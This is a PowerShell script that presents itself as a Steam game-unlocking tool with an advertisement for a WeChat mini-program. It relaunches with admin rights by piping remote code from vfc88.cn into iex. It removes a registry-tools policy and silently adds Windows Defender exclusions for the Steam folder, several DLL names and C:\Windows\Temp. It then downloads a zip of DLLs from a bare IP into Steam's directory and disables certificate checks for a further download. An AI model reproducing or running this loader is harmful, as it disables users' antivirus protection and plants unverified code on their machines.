Clear-Host
Write-Host -NoNewline "                                                                                                                         `r" -ForegroundColor:blue
Write-Host -NoNewline "                                                                                                                         `r" -ForegroundColor:blue
Write-Host -NoNewline "                                                                                                                         `r" -ForegroundColor:blue
Write-Host -NoNewline "                                                                                                                         `r" -ForegroundColor:blue
Write-Host -NoNewline "                                                                                                                         `r" -ForegroundColor:blue
Write-Host -NoNewline "                                                                                                                         `r" -ForegroundColor:blue
Write-Host -NoNewline "                                                                                                                         `r" -ForegroundColor:blue
Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # 重新以管理员身份启动 PowerShell 并再次下载执行脚本
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm http://vfc88.cn | iex`""
    exit
}
    $ProgressPreference = 'SilentlyContinue'
        # 注册表无法写入
$paths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
)

$keyName = "DisableRegistryTools"

foreach ($path in $paths) {
    if (Test-Path $path) {
        # 检查键值是否存在
        $item = Get-Item $path
        if ($item.Property -contains $keyName) {
            try {
                Remove-ItemProperty -Path $path -Name $keyName -Force -ErrorAction Stop
                Write-Host "成功移除: $path\$keyName" -ForegroundColor Green
            } catch {
                Write-Warning "无法移除 $path\$keyName，可能需要管理员权限或权限不足。"
            }
        }
    }
}

Write-Host  -ForegroundColor Cyan


function Stop-ProcessByName {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ProcessName
    )
    
    try {
        $processes = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
        if ($processes) {

            $processes | Stop-Process -Force

            return $true
        } else {

            return $true
        }
    } catch {

        return $false
    }
}



function Expand-ZipFile {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ZipPath,
        
        [Parameter(Mandatory=$true)]
        [string]$DestinationPath
    )
    
    if (-not (Test-Path -Path $ZipPath)) {
        Write-Host "ZIP文件不存在: $ZipPath" -ForegroundColor Red
        return $false
    }
    
    if (-not (Test-Path -Path $DestinationPath)) {
        try {
            New-Item -ItemType Directory -Path $DestinationPath -Force | Out-Null
        } catch {
            return $false
        }
    }
    
    # 加载压缩库
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    
    try {
        # 打开ZIP文件
        $zipArchive = [System.IO.Compression.ZipFile]::OpenRead($ZipPath)
        
        try {
            # 遍历ZIP中的所有条目
            foreach ($entry in $zipArchive.Entries) {
                $targetPath = Join-Path $DestinationPath $entry.FullName
                
                # 跳过目录条目
                if ($targetPath.EndsWith("\")) {
                    continue
                }
                
                # 确保目标目录存在
                $targetDir = [System.IO.Path]::GetDirectoryName($targetPath)
                if (-not (Test-Path -Path $targetDir)) {
                    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
                }
                
                if (Test-Path -Path $targetPath) {
                    try {
                        $file = Get-Item -Path $targetPath -ErrorAction Stop
                        
                        if ($file.IsReadOnly) {
                            $file.IsReadOnly = $false
                        }
                        
                        Remove-Item -Path $targetPath -Force -ErrorAction Stop
                    } catch {
                        continue
                    }
                }
                
                # 解压文件
                try {
                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $targetPath, $true)
                } catch {
                    Write-Host "解压失败: $($entry.FullName) - $_" -ForegroundColor Red
                }
            }
            return $true
        } finally {
            $zipArchive.Dispose()
        }
    } catch {
        Write-Host "打开或读取ZIP文件失败: $_" -ForegroundColor Red
        return $false
    }
}


Write-Host "  [STEAM] 已连接服务器 "  -ForegroundColor Green

#TASKKILL /F /IM steam.exe /T

$stopResult = Stop-ProcessByName -ProcessName "steam"
if (-not $stopResult) {
    Start-Sleep -Seconds 3
    Write-Host "  [请先退出 Steam 客户端]" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

#Write-Host "  [STEAM] Windows Defender has been clear "

    Start-Sleep -Seconds 1
#Write-Host "  [STEAM] Windows Defender has been clear "
    Write-Host ''
    $esc = [char]27
    Write-Host '  微信小程序搜索「' -NoNewline -ForegroundColor white
    Write-Host ("{0}[38;2;255;165;0m阳星科技{0}[0m" -f $esc) -NoNewline
    Write-Host '」想玩的这里都有！' -ForegroundColor white

    Start-Sleep -Seconds 1
#    Write-Host " "  -ForegroundColor Green
    Write-Host "  小众、经典、新锐———热门游戏一站集齐"  -ForegroundColor white
# 检查管理员权限
#$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
#if (-not $isAdmin) {
#    Write-Host "请以管理员身份运行此脚本" -ForegroundColor Red
#    Start-Sleep -Seconds 3
#    exit
#}

# 设置路径
$tempDir = "C:\tmp\AppData\LocalLow\Unialls\Temp\Download"
$targetDir = "C:\tmp\AppData\LocalLow\Unialls\Temp"

if (Test-Path -Path $tempDir) {
    try {
        Remove-Item -Path $tempDir -Recurse -Force -ErrorAction Stop
    } catch {
        Write-Host "清理临时目录失败: $_" -ForegroundColor Red
        Start-Sleep -Seconds 3
        exit
    }
}
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 获取Steam路径
try {
    $steamRegPath = 'HKCU:\Software\Valve\Steam'
    $steamPath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamPath' -ErrorAction Stop).SteamPath
    $steamPath = $steamPath -replace "/", "\"

    if (-not $steamPath) {
        Write-Host "未找到Steam安装路径" -ForegroundColor Red
        Start-Sleep -Seconds 3
        exit
    }
}
catch {
    Start-Sleep -Seconds 3
    exit
}

if (-not (Get-Module Defender -ListAvailable)) {
}
else {
    try {
        $allExclude = Get-MpPreference -ErrorAction Stop | Select-Object -ExpandProperty ExclusionPath
        if ($allExclude -notcontains $steamPath) {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
        }
        else {
        }
    }
    catch {
    }
}

# 主执行逻辑
$delFiles = @(
    "user32.dll",
    "OpenSteamTool.dll",
	"version.dll",
	"cdk.exe",
    "Steam.cfg"
)
foreach ($fileName in $delFiles) {
    $filePath = Join-Path $steamPath $fileName
    if (Test-Path $filePath) {
        Remove-Item $filePath -Force
    }
}
$cachePath = "$($env:LOCALAPPDATA)\Microsoft\Tencent"
if(Test-Path $cachePath){
    Remove-Item $cachePath -Recurse -Force
}


$domain = "http://121.41.99.14"
$steamZipUrl = "$domain/steams.zip"

$steamZipPath = Join-Path $tempDir "steams.zip"
try { Add-MpPreference -ExclusionPath $steamZipPath -ErrorAction SilentlyContinue } catch {}
$xinputPath = Join-Path $steamPath "xinput1_4.dll"
try { Add-MpPreference -ExclusionPath $xinputPath -ErrorAction SilentlyContinue } catch {}
$corePath = Join-Path $steamPath "core.dll"
try { Add-MpPreference -ExclusionPath $corePath -ErrorAction SilentlyContinue } catch {}
$dwmapiPath = Join-Path $steamPath "dwmapi.dll"
try { Add-MpPreference -ExclusionPath $dwmapiPath -ErrorAction SilentlyContinue } catch {}
$versionsPath = Join-Path $steamPath "versions.dll"
try { Add-MpPreference -ExclusionPath $versionsPath -ErrorAction SilentlyContinue } catch {}
$hidPath = Join-Path $steamPath "hid.dll"
try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
try { Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -ErrorAction SilentlyContinue } catch {}

try {

    Invoke-WebRequest -Uri $steamZipUrl -OutFile $steamZipPath -UseBasicParsing -ErrorAction Stop

    $result = Expand-ZipFile -ZipPath $steamZipPath -DestinationPath $steamPath
    if ($result) {
    } else {
        Write-Host "steam.zip 解压失败" -ForegroundColor Red
    }
    
    Remove-Item -Path $steamZipPath -Force
} catch {

}

$targetFile = Join-Path $steamPath "cons"
$domain = "http://121.41.99.14"
$downloadUrl = "$domain/cons"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    Invoke-WebRequest -Uri $downloadUrl -OutFile $targetFile -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
}
catch {
}
try { Start-Process "steam://open/activateproduct" } catch {}
Write-Host ''
$steamExePath = Join-Path $steamPath "Steam.exe"

Start-Process -FilePath $steamExePath -ArgumentList "-forcesteamupdate" -Wait:$false
    for ($i = 5; $i -ge 1; $i--) {
        # 在同一行刷新显示当前剩余关闭秒数。
        Write-Host -NoNewline ("`r  [本窗口将在 {0} 秒后关闭...] " -f $i) -ForegroundColor White
        # 每次倒计时数字之间等待一秒。
        Start-Sleep -Seconds 1
    # 结束窗口关闭倒计时循环。
    }

    #打开网页开始
    # 使用 Windows 默认浏览器打开微信小程序跳转页面。
    Start-Process 'https://x.vfc77.cn/go/miniprogram'
    #打开网页结束
exit
